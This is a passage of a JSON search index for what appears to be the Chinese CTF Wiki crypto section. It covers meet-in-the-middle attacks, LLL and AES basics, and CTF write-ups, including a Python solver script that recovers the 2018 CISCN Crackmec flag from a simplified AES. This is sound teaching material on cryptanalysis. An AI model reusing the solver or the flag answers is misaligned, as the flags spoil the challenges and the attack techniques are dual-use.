\u4f4d\u5bc6\u94a5\u3002\u5728\u8fdb\u884c\u9010\u4f4d\u7206\u7834\u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u4ece\u83b7\u53d6\u4e24\u4e2a\u53ef\u80fd\u7ed3\u679c [2659900894, 2659900895] \u518d\u6839\u636e\u5de6\u8fb9\u7684\u7ed3\u679c\uff0c\u53ef\u4ee5\u53bb\u83b7\u53d6\u53f3\u8fb9\u53ef\u80fd\u7684\u7ed3\u679c\uff0c\u5229\u7528 2659900894 \u83b7\u53d6\u7684\u53ef\u80fd\u7684\u7ed3\u679c\u5982\u4e0b # \u7b2c\u4e00\u7ec4\u660e\u5bc6\u6587\u5bf9\u5bf9\u5e94\u7684\u5bc6\u94a5\u53ef\u80fd\u592a\u591a\u3002 # \u7b2c\u4e8c\u7ec4\u4e00\u5171 6 \u4e2a\u3002 [2764038144, 2764038145, 2764038152, 2764038153, 2764038154, 2764038155] # \u7b2c\u4e09\u7ec4 [2764038144, 2764038145] \u7136\u540e\u5176\u5b9e\u6211\u4eec\u5c31\u53ef\u4ee5\u624b\u5de5\u8bd5\u4e00\u4e0b\u52a0\u5bc6\u6240\u6709\u7684\u660e\u5bc6\u6587\uff0c\u5982\u679c\u4e0d\u5bf9\uff0c\u5c31\u76f4\u63a5\u5224\u65ad\u9519\u8bef\u5373\u53ef\u4e86\u3002\u8fd9\u6837\u5176\u5b9e\u53ef\u4ee5\u5f88\u5feb\u53ef\u4ee5\u8fc7\u6ee4\u3002\u6700\u540e\u53ef\u4ee5\u53d1\u73b0\u5bc6\u94a5\u662f 2659900894|2764038145 \u4e5f\u5c31\u662f11424187353095200769\u3002\u4e5f\u5c31\u62ff\u5230\u4e86 flag\u3002 \u5f53\u7136\uff0c\u672c\u9898\u76ee\u4e5f\u53ef\u4ee5\u4f7f\u7528\u4e2d\u95f4\u76f8\u9047\u7684\u653b\u51fb\u65b9\u6cd5\uff0c\u4e5f\u5c31\u662f\u8bf4\u5206\u522b\u679a\u4e3e\u7b2c 0 \u8f6e\u4f7f\u7528\u7684\u5bc6\u94a5\u548c\u6700\u540e\u4e00\u8f6e\u4f7f\u7528\u7684\u5bc6\u94a5\u4f7f\u5176\u5728\u7b2c\u4e09\u8f6e\u76f8\u9047\u4ea7\u751f\u78b0\u649e\u3002","title":"2018 Plaid CTF tranducipher"},{"location":"crypto/attack_summary/bit-attack/#_3","text":"http://blog.rb-tree.xyz/2018/05/07/plaidctf-2018-transducipher/","title":"\u53c2\u8003"},{"location":"crypto/attack_summary/meet-in-the-middle/","text":"\u4e2d\u95f4\u76f8\u9047\u653b\u51fb - MITM \u00b6 \u6982\u8ff0 \u00b6 \u4e2d\u95f4\u76f8\u9047\u653b\u51fb\u662f\u4e00\u79cd\u4ee5\u7a7a\u95f4\u6362\u53d6\u65f6\u95f4\u7684\u4e00\u79cd\u653b\u51fb\u65b9\u6cd5\uff0c1977\u5e74\u7531 Diffie \u4e0e Hellman \u63d0\u51fa\u3002\u4ece\u4e2a\u4eba\u89d2\u5ea6\u770b\uff0c\u8005\u66f4\u591a\u5730\u6307\u4e00\u79cd\u601d\u60f3\uff0c\u4e0d\u4ec5\u4ec5\u9002\u7528\u4e8e\u5bc6\u7801\u5b66\u653b\u51fb\uff0c\u4e5f\u9002\u7528\u4e8e\u5176\u4ed6\u65b9\u9762\uff0c\u53ef\u4ee5\u964d\u4f4e\u7b97\u6cd5\u7684\u590d\u6742\u5ea6\u3002 \u57fa\u672c\u539f\u7406\u5982\u4e0b \u5047\u8bbe E \u548c D \u5206\u522b\u662f\u52a0\u5bc6\u51fd\u6570\u548c\u89e3\u5bc6\u51fd\u6570\uff0ck1 \u548c k2 \u5206\u522b\u662f\u4e24\u6b21\u52a0\u5bc6\u4f7f\u7528\u7684\u5bc6\u94a5\uff0c\u5219\u6211\u4eec\u6709 C=E_{k_2}(E_{k_1}(P)) C=E_{k_2}(E_{k_1}(P)) P=D_{k_2}(D_{k_1}(C)) P=D_{k_2}(D_{k_1}(C)) \u5219\u6211\u4eec\u53ef\u4ee5\u63a8\u51fa E_{k_1}(P)=D_{k_2}(C) E_{k_1}(P)=D_{k_2}(C) \u90a3\u4e48\uff0c\u5f53\u7528\u6237\u77e5\u9053\u4e00\u5bf9\u660e\u6587\u548c\u5bc6\u6587\u65f6 \u653b\u51fb\u8005\u53ef\u4ee5\u679a\u4e3e\u6240\u6709\u7684 k1\uff0c\u5c06 P \u6240\u6709\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u5b58\u50a8\u8d77\u6765\uff0c\u5e76\u6309\u7167\u5bc6\u6587\u7684\u5927\u5c0f\u8fdb\u884c\u6392\u5e8f\u3002 \u653b\u51fb\u8005\u8fdb\u4e00\u6b65\u679a\u4e3e\u6240\u6709\u7684k2\uff0c\u5c06\u5bc6\u6587 C \u8fdb\u884c\u89e3\u5bc6\u5f97\u5230 C1\uff0c\u5728\u7b2c\u4e00\u6b65\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u4e2d\u641c\u7d22 C1\uff0c\u5982\u679c\u641c\u7d22\u5230\uff0c\u5219\u6211\u4eec\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u53ef\u4ee5\u8ba4\u4e3a\u6211\u4eec\u627e\u5230\u4e86\u6b63\u786e\u7684 k1 \u548c k2\u3002 \u5982\u679c\u89c9\u5f97\u7b2c\u4e8c\u6b65\u4e2d\u5f97\u5230\u7684\u7ed3\u679c\u4e0d\u4fdd\u9669\uff0c\u5219\u6211\u4eec\u8fd8\u53ef\u4ee5\u518d\u627e\u4e00\u4e9b\u660e\u5bc6\u6587\u5bf9\u8fdb\u884c\u9a8c\u8bc1\u3002 \u5047\u8bbe k1 \u548c k2 \u7684\u5bc6\u94a5\u957f\u5ea6\u90fd\u4e3a n\uff0c\u5219\u539f\u5148\u6211\u4eec\u66b4\u529b\u679a\u4e3e\u9700\u8981 O(n^2) O(n^2) \uff0c\u73b0\u5728\u6211\u4eec\u53ea\u9700\u8981 O(n log_2n) O(n log_2n) \u3002 \u8fd9\u4e0e 2DES \u7684\u4e2d\u95f4\u76f8\u9047\u653b\u51fb\u7c7b\u4f3c\u3002 \u9898\u76ee \u00b6 2018 \u56fd\u8d5b Crackmec\uff0c\u53c2\u89c1 Wiki AES \u90e8\u5206 2018 Plaid CTF Transducipher\uff0c\u53c2\u89c1\u6bd4\u7279\u653b\u51fb\u90e8\u5206\u7684\u539f\u7406\u3002 2018 \u56fd\u8d5b Crackme java\uff0c\u53c2\u89c1 Wiki \u6574\u6570\u57df\u4e0a\u7684\u79bb\u6563\u5bf9\u6570\u90e8\u5206 2018 WCTF RSA\uff0c\u53c2\u89c1 wiki RSA Complex \u90e8\u5206 \u53c2\u8003\u6587\u732e \u00b6 https://zh.wikipedia.org/wiki/%E4%B8%AD%E9%80%94%E7%9B%B8%E9%81%87%E6%94%BB%E6%93%8A","title":"\u4e2d\u95f4\u76f8\u9047\u653b\u51fb"},{"location":"crypto/attack_summary/meet-in-the-middle/#-mitm","text":"","title":"\u4e2d\u95f4\u76f8\u9047\u653b\u51fb - MITM"},{"location":"crypto/attack_summary/meet-in-the-middle/#_1","text":"\u4e2d\u95f4\u76f8\u9047\u653b\u51fb\u662f\u4e00\u79cd\u4ee5\u7a7a\u95f4\u6362\u53d6\u65f6\u95f4\u7684\u4e00\u79cd\u653b\u51fb\u65b9\u6cd5\uff0c1977\u5e74\u7531 Diffie \u4e0e Hellman \u63d0\u51fa\u3002\u4ece\u4e2a\u4eba\u89d2\u5ea6\u770b\uff0c\u8005\u66f4\u591a\u5730\u6307\u4e00\u79cd\u601d\u60f3\uff0c\u4e0d\u4ec5\u4ec5\u9002\u7528\u4e8e\u5bc6\u7801\u5b66\u653b\u51fb\uff0c\u4e5f\u9002\u7528\u4e8e\u5176\u4ed6\u65b9\u9762\uff0c\u53ef\u4ee5\u964d\u4f4e\u7b97\u6cd5\u7684\u590d\u6742\u5ea6\u3002 \u57fa\u672c\u539f\u7406\u5982\u4e0b \u5047\u8bbe E \u548c D \u5206\u522b\u662f\u52a0\u5bc6\u51fd\u6570\u548c\u89e3\u5bc6\u51fd\u6570\uff0ck1 \u548c k2 \u5206\u522b\u662f\u4e24\u6b21\u52a0\u5bc6\u4f7f\u7528\u7684\u5bc6\u94a5\uff0c\u5219\u6211\u4eec\u6709 C=E_{k_2}(E_{k_1}(P)) C=E_{k_2}(E_{k_1}(P)) P=D_{k_2}(D_{k_1}(C)) P=D_{k_2}(D_{k_1}(C)) \u5219\u6211\u4eec\u53ef\u4ee5\u63a8\u51fa E_{k_1}(P)=D_{k_2}(C) E_{k_1}(P)=D_{k_2}(C) \u90a3\u4e48\uff0c\u5f53\u7528\u6237\u77e5\u9053\u4e00\u5bf9\u660e\u6587\u548c\u5bc6\u6587\u65f6 \u653b\u51fb\u8005\u53ef\u4ee5\u679a\u4e3e\u6240\u6709\u7684 k1\uff0c\u5c06 P \u6240\u6709\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u5b58\u50a8\u8d77\u6765\uff0c\u5e76\u6309\u7167\u5bc6\u6587\u7684\u5927\u5c0f\u8fdb\u884c\u6392\u5e8f\u3002 \u653b\u51fb\u8005\u8fdb\u4e00\u6b65\u679a\u4e3e\u6240\u6709\u7684k2\uff0c\u5c06\u5bc6\u6587 C \u8fdb\u884c\u89e3\u5bc6\u5f97\u5230 C1\uff0c\u5728\u7b2c\u4e00\u6b65\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u4e2d\u641c\u7d22 C1\uff0c\u5982\u679c\u641c\u7d22\u5230\uff0c\u5219\u6211\u4eec\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u53ef\u4ee5\u8ba4\u4e3a\u6211\u4eec\u627e\u5230\u4e86\u6b63\u786e\u7684 k1 \u548c k2\u3002 \u5982\u679c\u89c9\u5f97\u7b2c\u4e8c\u6b65\u4e2d\u5f97\u5230\u7684\u7ed3\u679c\u4e0d\u4fdd\u9669\uff0c\u5219\u6211\u4eec\u8fd8\u53ef\u4ee5\u518d\u627e\u4e00\u4e9b\u660e\u5bc6\u6587\u5bf9\u8fdb\u884c\u9a8c\u8bc1\u3002 \u5047\u8bbe k1 \u548c k2 \u7684\u5bc6\u94a5\u957f\u5ea6\u90fd\u4e3a n\uff0c\u5219\u539f\u5148\u6211\u4eec\u66b4\u529b\u679a\u4e3e\u9700\u8981 O(n^2) O(n^2) \uff0c\u73b0\u5728\u6211\u4eec\u53ea\u9700\u8981 O(n log_2n) O(n log_2n) \u3002 \u8fd9\u4e0e 2DES \u7684\u4e2d\u95f4\u76f8\u9047\u653b\u51fb\u7c7b\u4f3c\u3002","title":"\u6982\u8ff0"},{"location":"crypto/attack_summary/meet-in-the-middle/#_2","text":"2018 \u56fd\u8d5b Crackmec\uff0c\u53c2\u89c1 Wiki AES \u90e8\u5206 2018 Plaid CTF Transducipher\uff0c\u53c2\u89c1\u6bd4\u7279\u653b\u51fb\u90e8\u5206\u7684\u539f\u7406\u3002 2018 \u56fd\u8d5b Crackme java\uff0c\u53c2\u89c1 Wiki \u6574\u6570\u57df\u4e0a\u7684\u79bb\u6563\u5bf9\u6570\u90e8\u5206 2018 WCTF RSA\uff0c\u53c2\u89c1 wiki RSA Complex \u90e8\u5206","title":"\u9898\u76ee"},{"location":"crypto/attack_summary/meet-in-the-middle/#_3","text":"https://zh.wikipedia.org/wiki/%E4%B8%AD%E9%80%94%E7%9B%B8%E9%81%87%E6%94%BB%E6%93%8A","title":"\u53c2\u8003\u6587\u732e"},{"location":"crypto/basic/introduction/","text":"\u57fa\u7840\u6570\u5b66\u77e5\u8bc6 \u00b6 \u672c\u90e8\u5206\u4f1a\u4ecb\u7ecd\u201c\u57fa\u7840\u6570\u5b66\u77e5\u8bc6\u201c\uff0c\u8fd9\u91cc\u52a0\u4e86\u5f15\u53f7\uff0c\u6240\u4ee5\u5e76\u4e0d\u89c1\u5f97\u771f\u7684\u5f88\u57fa\u7840\u3002\u3002","title":"\u7b80\u4ecb"},{"location":"crypto/basic/introduction/#_1","text":"\u672c\u90e8\u5206\u4f1a\u4ecb\u7ecd\u201c\u57fa\u7840\u6570\u5b66\u77e5\u8bc6\u201c\uff0c\u8fd9\u91cc\u52a0\u4e86\u5f15\u53f7\uff0c\u6240\u4ee5\u5e76\u4e0d\u89c1\u5f97\u771f\u7684\u5f88\u57fa\u7840\u3002\u3002","title":"\u57fa\u7840\u6570\u5b66\u77e5\u8bc6"},{"location":"crypto/basic/lll/","text":"Lenstra\u2013Lenstra\u2013Lovasz \u00b6 \u683c\u7684\u57fa\u672c\u5b9a\u4e49\u5982\u4e0b LLL \u7b97\u6cd5\u5c31\u662f\u5728\u683c\u4e0a\u627e\u5230\u4e00\u7ec4\u57fa\uff0c\u6ee1\u8db3\u5982\u4e0b\u6548\u679c \u800c\u4e14\uff0c\u8fd9\u79cd\u65b9\u6cd5\u751f\u6210\u7684\u57fa\u6240\u5177\u6709\u7684\u5982\u4e0b\u6027\u8d28\u662f\u975e\u5e38\u6709\u7528\u7684 \u53c2\u8003\u6587\u732e \u00b6 Survey: Lattice Reduction Attacks on RSA","title":"LLL"},{"location":"crypto/basic/lll/#lenstralenstralovasz","text":"\u683c\u7684\u57fa\u672c\u5b9a\u4e49\u5982\u4e0b LLL \u7b97\u6cd5\u5c31\u662f\u5728\u683c\u4e0a\u627e\u5230\u4e00\u7ec4\u57fa\uff0c\u6ee1\u8db3\u5982\u4e0b\u6548\u679c \u800c\u4e14\uff0c\u8fd9\u79cd\u65b9\u6cd5\u751f\u6210\u7684\u57fa\u6240\u5177\u6709\u7684\u5982\u4e0b\u6027\u8d28\u662f\u975e\u5e38\u6709\u7528\u7684","title":"Lenstra\u2013Lenstra\u2013Lovasz"},{"location":"crypto/basic/lll/#_1","text":"Survey: Lattice Reduction Attacks on RSA","title":"\u53c2\u8003\u6587\u732e"},{"location":"crypto/blockcipher/aes/","text":"AES \u00b6 \u57fa\u672c\u4ecb\u7ecd \u00b6 Advanced Encryption Standard\uff08AES\uff09\uff0c\u9ad8\u7ea7\u52a0\u5bc6\u6807\u51c6\uff0c\u662f\u5178\u578b\u7684\u5757\u52a0\u5bc6\uff0c\u88ab\u8bbe\u8ba1\u6765\u53d6\u4ee3 DES\uff0c\u7531 Joan Daemen \u548c Vincent Rijmen \u6240\u8bbe\u8ba1\u3002\u5176\u57fa\u672c\u4fe1\u606f\u5982\u4e0b \u8f93\u5165\uff1a128 \u6bd4\u7279\u3002 \u8f93\u51fa\uff1a128 \u6bd4\u7279\u3002 SPN \u7f51\u7edc\u7ed3\u6784\u3002 \u5176\u8fed\u4ee3\u8f6e\u6570\u4e0e\u5bc6\u94a5\u957f\u5ea6\u6709\u5173\u7cfb\uff0c\u5982\u4e0b \u5bc6\u94a5\u957f\u5ea6\uff08\u6bd4\u7279\uff09 \u8fed\u4ee3\u8f6e\u6570 128 10 192 12 256 14 \u57fa\u672c\u6d41\u7a0b \u00b6 \u57fa\u672c\u6982\u5ff5 \u00b6 \u5728 AES \u52a0\u89e3\u5bc6\u8fc7\u7a0b\u4e2d\uff0c\u6bcf\u4e00\u5757\u90fd\u662f 128 \u6bd4\u7279\uff0c\u6240\u4ee5\u6211\u4eec\u8fd9\u91cc\u660e\u786e\u4e00\u4e9b\u57fa\u672c\u6982\u5ff5\u3002 \u5728 AES \u4e2d\uff0c\u5757\u4e0e State \u4e4b\u95f4\u7684\u8f6c\u6362\u8fc7\u7a0b\u5982\u4e0b \u6240\u4ee5\uff0c\u53ef\u4ee5\u770b\u51fa\uff0c\u6bcf\u4e00\u4e2a block \u4e2d\u7684\u5b57\u8282\u662f\u6309\u7167\u5217\u6392\u5217\u8fdb\u5165\u5230\u72b6\u6001\u6570\u7ec4\u7684\u3002 \u800c\u5bf9\u4e8e\u660e\u6587\u6765\u8bf4\uff0c\u4e00\u822c\u6211\u4eec\u4f1a\u9009\u62e9\u4f7f\u7528\u5176\u5341\u516d\u8fdb\u5236\u8fdb\u884c\u7f16\u7801\u3002 \u52a0\u89e3\u5bc6\u8fc7\u7a0b \u00b6 \u8fd9\u91cc\u7ed9\u4e2a\u770b\u96ea\u4e0a\u6bd4\u8f83\u597d\u7684 \u56fe\u4f8b \uff0c\u4ee5\u4fbf\u4e8e\u4ecb\u7ecd\u57fa\u672c\u7684\u6d41\u7a0b\uff0c\u6bcf\u4e00\u8f6e\u4e3b\u8981\u5305\u62ec \u8f6e\u5bc6\u94a5\u52a0\uff0cAddRoundKey \u5b57\u8282\u66ff\u6362\uff0cSubBytes \u884c\u79fb\u4f4d\uff0cShiftRows \u5217\u6df7\u6dc6\uff0cMixColumns \u4e0a\u9762\u7684\u5217\u6df7\u6dc6\u7684\u77e9\u9635\u4e58\u6cd5\u7b49\u53f7\u5de6\u8fb9\u7684\u5217\u5411\u91cf\u5e94\u8be5\u5728\u53f3\u8fb9\u3002 \u8fd9\u91cc\u518d\u7ed9\u4e00\u5f20\u5176\u52a0\u89e3\u5bc6\u7684\u5168\u56fe\uff0c\u5176\u89e3\u5bc6\u7b97\u6cd5\u7684\u6b63\u786e\u6027\u5f88\u663e\u7136\u3002 \u6211\u4eec\u8fd9\u91cc\u91cd\u70b9\u5173\u6ce8\u4e00\u4e0b\u4ee5\u4e0b\u3002 \u5b57\u8282\u66ff\u6362 \u00b6 \u5728\u5b57\u8282\u66ff\u6362\u7684\u80cc\u540e\uff0c\u5176\u5b9e\u662f\u6709\u5bf9\u5e94\u7684\u6570\u5b66\u89c4\u5219\u6765\u5b9a\u4e49\u5bf9\u5e94\u7684\u66ff\u6362\u8868\u7684\uff0c\u5982\u4e0b \u8fd9\u91cc\u7684\u8fd0\u7b97\u5747\u5b9a\u4e49\u5728 GF(2^8) GF(2^8) \u5185\u3002 \u5217\u6df7\u6dc6 \u00b6 \u8fd9\u91cc\u7684\u8fd0\u7b97\u4e5f\u662f\u5b9a\u4e49\u5728 GF(2^8) GF(2^8) \u4e0a\uff0c\u4f7f\u7528\u7684\u6a21\u591a\u9879\u5f0f\u4e3a x^8+x^4+x^3+1 x^8+x^4+x^3+1 \u3002 \u5bc6\u94a5\u6269\u5c55 \u00b6 \u7b49\u4ef7\u89e3\u5bc6\u7b97\u6cd5 \u00b6 \u7b80\u5355\u5206\u6790\u4e00\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0 \u4ea4\u6362\u9006\u5411\u884c\u79fb\u4f4d\u548c\u9006\u5411\u5b57\u8282\u4ee3\u66ff\u5e76\u4e0d\u5f71\u54cd\u7ed3\u679c\u3002 \u4ea4\u6362\u8f6e\u5bc6\u94a5\u52a0\u548c\u9006\u5411\u5217\u6df7\u6dc6\u5e76\u4e0d\u5f71\u54cd\u7ed3\u679c\uff0c\u5173\u952e\u5728\u4e8e \u9996\u5148\u53ef\u4ee5\u628a\u5f02\u6216\u770b\u6210\u57df\u4e0a\u7684\u591a\u9879\u5f0f\u52a0\u6cd5 \u7136\u540e\u591a\u9879\u5f0f\u4e2d\u4e58\u6cd5\u5bf9\u52a0\u6cd5\u5177\u6709\u5206\u914d\u7387\u3002 \u653b\u51fb\u65b9\u6cd5 \u00b6 \u79ef\u5206\u653b\u51fb 2018 \u56fd\u8d5b Crackmec \u00b6 \u901a\u8fc7\u7b80\u5355\u5206\u6790\u8fd9\u4e2a\u7b97\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a\u7b97\u6cd5\u662f\u4e00\u4e2a\u7b80\u5316\u7248\u7684 AES\uff0c\u5176\u57fa\u672c\u64cd\u4f5c\u4e3a 9 \u8f6e\u8fed\u4ee3 \u884c\u79fb\u4f4d \u53d8\u79cd\u5b57\u8282\u66ff\u6362 \u5982\u4e0b memcpy ( cipher , plain , 0x10uLL ); for ( i = 0LL ; i <= 8 ; ++ i ) { shift_row ( cipher ); for ( j = 0LL ; j <= 3 ; ++ j ) * ( _DWORD * ) & cipher [ 4 * j ] = box [(( 4 * j + 3 + 16 * i ) << 8 ) + ( unsigned __int8 ) cipher [ 4 * j + 3 ]] ^ box [(( 4 * j + 2 + 16 * i ) << 8 ) + ( unsigned __int8 ) cipher [ 4 * j + 2 ]] ^ box [(( 4 * j + 1 + 16 * i ) << 8 ) + ( unsigned __int8 ) cipher [ 4 * j + 1 ]] ^ box [(( 4 * j + 16 * i ) << 8 ) + ( unsigned __int8 ) cipher [ 4 * j ]]; } result = shift_row ( cipher ); for ( k = 0LL ; k <= 0xF ; ++ k ) { result = subbytes [ 256 * k + ( unsigned __int8 ) cipher [ k ]]; cipher [ k ] = result ; } return result ; \u6839\u636e\u7a0b\u5e8f\u6d41\u7a0b\uff0c\u6211\u4eec\u5df2\u77e5\u7a0b\u5e8f\u52a0\u5bc6\u7684\u7ed3\u679c\uff0c\u800c subbytes \u548c shift_row \u53c8\u662f\u53ef\u9006\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u83b7\u53d6\u6700\u540e\u4e00\u8f6e\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u3002\u6b64\u65f6\uff0c\u6211\u4eec\u8fd8\u77e5\u9053 box \u5bf9\u5e94\u7684\u5e38\u6570\uff0c\u6211\u4eec\u53ea\u662f\u4e0d\u77e5\u9053\u4e0a\u4e00\u8f6e\u4e2d cipher[4*j] \u5bf9\u5e94\u7684\u503c\uff0c\u4e00\u5171 32 \u4f4d\uff0c\u5982\u679c\u6211\u4eec\u76f4\u63a5\u7206\u7834\u7684\u8bdd\uff0c\u663e\u7136\u4e0d\u53ef\u53d6\uff0c\u56e0\u4e3a\u6bcf\u4e00\u8f6e\u90fd\u9700\u8981\u8fd9\u4e48\u7206\u7834\uff0c\u65f6\u95f4\u4e0d\u53ef\u63a5\u53d7\u3002\u90a3\u4e48\u6709\u6ca1\u6709\u5176\u5b83\u529e\u6cd5\u5462\uff1f\u5176\u5b9e\u6709\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u4e2d\u95f4\u76f8\u9047\u653b\u51fb\uff0c\u5373\u9996\u5148\u679a\u4e3e\u6240\u6709\u7684 cipher[4*j] \u4e0e cipher[4*j+1] \u7684\u5b57\u8282\u7ec4\u5408\uff0c\u4e00\u5171256*256 \u79cd\u3002\u5728\u679a\u4e3e\u5269\u4e0b\u4e24\u4e2a\u5b57\u8282\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u5148\u8ba1\u7b97\u51fa\u5176\u4e0e\u5bc6\u6587\u7684\u5f02\u6216\u503c\uff0c\u7136\u540e\u53bb\u4e4b\u524d\u7684\u7ec4\u5408\u4e2d\u627e\uff0c\u5982\u679c\u627e\u5230\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u8ba4\u4e3a\u662f\u6b63\u786e\u7684\u3002\u8fd9\u6837\u590d\u6742\u5ea6\u77ac\u95f4\u964d\u5230 O(2^{16}) O(2^{16}) \u3002 \u4ee3\u7801\u5982\u4e0b encflag = [ 0x16 , 0xEA , 0xCA , 0xCC , 0xDA , 0xC8 , 0xDE , 0x1B , 0x16 , 0x03 , 0xF8 , 0x84 , 0x69 , 0x23 , 0xB2 , 0x25 ] subbytebox = eval ( open ( './subbytes' ) . read ()) box = eval ( open ( './box' ) . read ()) print subbytebox [ - 1 ], box [ - 1 ] def inv_shift_row ( now ): tmp = now [ 13 ] now [ 13 ] = now [ 9 ] now [ 9 ] = now [ 5 ] now [ 5 ] = now [ 1 ] now [ 1 ] = tmp tmp = now [ 10 ] now [ 10 ] = now [ 2 ] now [ 2 ] = tmp tmp = now [ 14 ] now [ 14 ] = now [ 6 ] now [ 6 ] = tmp tmp = now [ 15 ] now [ 15 ] = now [ 3 ] now [ 3 ] = now [ 7 ] now [ 7 ] = now [ 11 ] now [ 11 ] = tmp return now def byte2num ( a ): num = 0 for i in range ( 3 , - 1 , - 1 ): num = num * 256 num += a [ i ] return num def getbytes ( i , j , target ): \"\"\" box[((4 * j + 3 + 16 * i) << 8) + a2[4 * j + 3]] box[((4 * j + 2 + 16 * i) << 8 )+ a2[4 * j + 2]] box[((4 * j + 1 + 16 * i) << 8) + a2[4 * j + 1]] box[((4 * j + 16 * i) << 8) + a2[4 * j]]; \"\"\" box01 = dict () for c0 in range ( 256 ): for c1 in range ( 256 ): num0 = (( 4 * j + 16 * i ) << 8 ) + c0 num1 = (( 4 * j + 1 + 16 * i ) << 8 ) + c1 num = box [ num0 ] ^ box [ num1 ] box01 [ num ] = ( c0 , c1 ) for c2 in range ( 256 ): for c3 in range ( 256 ): num2 = (( 4 * j + 2 + 16 * i ) << 8 ) + c2 num3 = (( 4 * j + 3 + 16 * i ) << 8 ) + c3 num = box [ num2 ] ^ box [ num3 ] calc = num ^ target if calc in box01 : c0 , c1 = box01 [ calc ] return c0 , c1 , c2 , c3 print 'not found' print i , j , target , calc exit ( 0 ) def solve (): a2 = [ 0 ] * 16 \"\"\" for ( k = 0LL; k <= 0xF; ++k ) { result = subbytesbox[256 * k + a2[k]]; a2[k] = result; } \"\"\" for i in range ( 15 , - 1 , - 1 ): tag = 0 for j in range ( 256 ): if subbytebox [ 256 * i + j ] == encflag [ i ]: # j = a2[k] tag += 1 a2 [ i ] = j if tag == 2 : print 'two number' , i exit ( 0 ) \"\"\" result = shift_row(a2); \"\"\" a2 = inv_shift_row ( a2 ) \"\"\" for ( i = 0LL; i <= 8; ++i ) { shift_row(a2); for ( j = 0LL; j <= 3; ++j ) *(_DWORD *)&a2[4 * j] = box[((4 * j + 3 + 16 * i) << 8) + a2[4 * j + 3]] ^ box[((4 * j + 2 + 16 * i) << 8) + a2[4 * j + 2]] ^ box[((4 * j + 1 + 16 * i) << 8) + a2[4 * j + 1]] ^ box[((4 * j + 16 * i) << 8) + a2[4 * j]]; } \"\"\" for i in range ( 8 , - 1 , - 1 ): tmp = [ 0 ] * 16 print 'round ' , i for j in range ( 0 , 4 ): num = byte2num ( a2 [ 4 * j : 4 * j + 4 ]) #print num, a2[4 * j:4 * j + 4] tmp [ 4 * j ], tmp [ 4 * j + 1 ], tmp [ 4 * j + 2 ], tmp [ 4 * j + 3 ] = getbytes ( i , j , num ) a2 = inv_shift_row ( tmp ) print a2 print '' . join ( chr ( c ) for c in a2 ) if __name__ == \"__main__\" : solve () \u8fd0\u884c\u7ed3\u679c \u279c cracemec git: ( master ) \u2717 python exp.py 211 3549048324 round 8 round 7 round 6 round 5 round 4 round 3 round 2 round 1 round 0 [ 67 , 73 , 83 , 67 , 78 , 98 , 35 , 97 , 100 , 102 , 115 , 64 , 70 , 122 , 57 , 51 ] CISCNb#adfs@Fz93 \u9898\u76ee \u00b6 2018 \u5f3a\u7f51\u676f \u51b3\u8d5b revolver \u53c2\u8003\u6587\u732e \u00b6 https://zh.wikipedia.org/wiki/%E9%AB%98%E7%BA%A7%E5%8A%A0%E5%AF%86%E6%A0%87%E5%87%86 Cryptography and Network Security\uff0c Advanced Encryption Standard ppt","title":"AES"},{"location":"crypto/blockcipher/aes/#aes","text":"","title":"AES"},{"location":"crypto/blockcipher/aes/#_1","text":"Advanced Encryption Standard\uff08AES\uff09\uff0c\u9ad8\u7ea7\u52a0\u5bc6\u6807\u51c6\uff0c\u662f\u5178\u578b\u7684\u5757\u52a0\u5bc6\uff0c\u88ab\u8bbe\u8ba1\u6765\u53d6\u4ee3 DES\uff0c\u7531 Joan Daemen \u548c Vincent Rijmen \u6240\u8bbe\u8ba1\u3002\u5176\u57fa\u672c\u4fe1\u606f\u5982\u4e0b \u8f93\u5165\uff1a128 \u6bd4\u7279\u3002 \u8f93\u51fa\uff1a128 \u6bd4\u7279\u3002 SPN \u7f51\u7edc\u7ed3\u6784\u3002 \u5176\u8fed\u4ee3\u8f6e\u6570\u4e0e\u5bc6\u94a5\u957f\u5ea6\u6709\u5173\u7cfb\uff0c\u5982\u4e0b \u5bc6\u94a5\u957f\u5ea6\uff08\u6bd4\u7279\uff09 \u8fed\u4ee3\u8f6e\u6570 128 10 192 12 256 14","title":"\u57fa\u672c\u4ecb\u7ecd"},{"location":"crypto/blockcipher/aes/#_2","text":"","title":"\u57fa\u672c\u6d41\u7a0b"},{"location":"crypto/blockcipher/aes/#_3","text":"\u5728 AES \u52a0\u89e3\u5bc6\u8fc7\u7a0b\u4e2d\uff0c\u6bcf\u4e00\u5757\u90fd\u662f 128 \u6bd4\u7279\uff0c\u6240\u4ee5\u6211\u4eec\u8fd9\u91cc\u660e\u786e\u4e00\u4e9b\u57fa\u672c\u6982\u5ff5\u3002 \u5728 AES \u4e2d\uff0c\u5757\u4e0e State \u4e4b\u95f4\u7684\u8f6c\u6362\u8fc7\u7a0b\u5982\u4e0b \u6240\u4ee5\uff0c\u53ef\u4ee5\u770b\u51fa\uff0c\u6bcf\u4e00\u4e2a block \u4e2d\u7684\u5b57\u8282\u662f\u6309\u7167\u5217\u6392\u5217\u8fdb\u5165\u5230\u72b6\u6001\u6570\u7ec4\u7684\u3002 \u800c\u5bf9\u4e8e\u660e\u6587\u6765\u8bf4\uff0c\u4e00\u822c\u6211\u4eec\u4f1a\u9009\u62e9\u4f7f\u7528\u5176\u5341\u516d\u8fdb\u5236\u8fdb\u884c\u7f16\u7801\u3002","title":"\u57fa\u672c\u6982\u5ff5"},{"location":"crypto/blockcipher/aes/#_4","text":"\u8fd9\u91cc\u7ed9\u4e2a\u770b\u96ea\u4e0a\u6bd4\u8f83\u597d\u7684 \u56fe\u4f8b \uff0c\u4ee5\u4fbf\u4e8e\u4ecb\u7ecd\u57fa\u672c\u7684\u6d41\u7a0b\uff0c\u6bcf\u4e00\u8f6e\u4e3b\u8981\u5305\u62ec 